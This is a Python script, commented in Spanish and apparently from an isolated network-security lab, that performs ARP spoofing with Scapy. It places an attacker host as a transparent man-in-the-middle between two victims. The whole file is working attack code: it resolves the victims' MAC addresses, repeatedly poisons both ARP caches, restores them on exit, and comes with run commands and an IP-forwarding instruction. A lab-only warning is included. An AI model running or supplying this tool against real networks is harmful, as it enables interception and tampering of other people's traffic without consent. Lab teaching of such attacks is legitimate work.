#!/usr/bin/env python3
"""
arp_spoof.py - Ataque ARP Spoofing (Fase 2) con Scapy.

Posiciona al atacante (h3) como Man-in-the-Middle entre dos victimas (h1 y h2)
envenenando sus caches ARP: a cada victima le hace creer que la MAC del atacante
es la del otro extremo. Asi todo el trafico entre h1 y h2 pasa por h3.

Para que la conectividad NO se interrumpa (MITM transparente), el host atacante
debe tener el reenvio IPv4 activo:  sysctl -w net.ipv4.ip_forward=1
(hosts/config_host.sh ya lo activa para h3).

Uso (en la VM atacante, como root):
    sudo python3 attack/arp_spoof.py --target 10.0.0.11 --gateway 10.0.0.12
    # o con los roles por defecto del laboratorio (h1 <-> h2):
    sudo python3 attack/arp_spoof.py

Al pulsar Ctrl+C restaura las caches ARP legitimas de ambas victimas.

ADVERTENCIA: uso exclusivo en el laboratorio aislado del proyecto.
"""

import argparse
import sys
import time

from scapy.all import ARP, Ether, send, srp, get_if_hwaddr, conf


def get_mac(ip, iface):
    """Resuelve la MAC de una IP enviando una peticion ARP (who-has)."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, retry=3, iface=iface, verbose=False,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None


def poison(target_ip, target_mac, spoof_ip, iface):
    """Envia a 'target' una respuesta ARP diciendo que 'spoof_ip' esta en NUESTRA MAC."""
    # op=2 -> is-at (respuesta ARP). hwsrc se omite: Scapy usa la MAC de la iface.
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, iface=iface, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac, iface):
    """Restaura la cache ARP legitima de 'target' (source_ip -> source_mac real)."""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=source_ip, hwsrc=source_mac)
    send(pkt, count=5, iface=iface, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing MITM (Fase 2)")
    parser.add_argument("--target", default="10.0.0.11",
                        help="IP de la victima A (por defecto h1: 10.0.0.11)")
    parser.add_argument("--gateway", default="10.0.0.12",
                        help="IP de la victima B/gateway (por defecto h2: 10.0.0.12)")
    parser.add_argument("--iface", default=conf.iface,
                        help="Interfaz de red del atacante (por defecto: la principal)")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Segundos entre reenvios de ARP envenenado")
    args = parser.parse_args()

    iface = str(args.iface)
    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception as e:
        print("[!] No se pudo leer la MAC de la interfaz %s: %s" % (iface, e))
        sys.exit(1)

    print("[*] Atacante en %s (MAC %s)" % (iface, attacker_mac))
    print("[*] Resolviendo MACs de las victimas...")
    target_mac = get_mac(args.target, iface)
    gateway_mac = get_mac(args.gateway, iface)

    if not target_mac or not gateway_mac:
        print("[!] No se pudo resolver alguna MAC. "
              "Verifica conectividad e interfaz (target=%s, gateway=%s)"
              % (target_mac, gateway_mac))
        sys.exit(1)

    print("[+] Victima A  %s -> %s" % (args.target, target_mac))
    print("[+] Victima B  %s -> %s" % (args.gateway, gateway_mac))
    print("[*] Envenenando (Ctrl+C para detener y restaurar)...")

    sent = 0
    try:
        while True:
            # A cree que B esta en nuestra MAC, y B cree que A esta en nuestra MAC.
            poison(args.target, target_mac, args.gateway, iface)
            poison(args.gateway, gateway_mac, args.target, iface)
            sent += 2
            print("\r[+] Paquetes ARP enviados: %d" % sent, end="")
            sys.stdout.flush()
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Restaurando caches ARP legitimas...")
        restore(args.target, target_mac, args.gateway, gateway_mac, iface)
        restore(args.gateway, gateway_mac, args.target, target_mac, iface)
        print("[+] Hecho. Caches restauradas.")


if __name__ == "__main__":
    main()
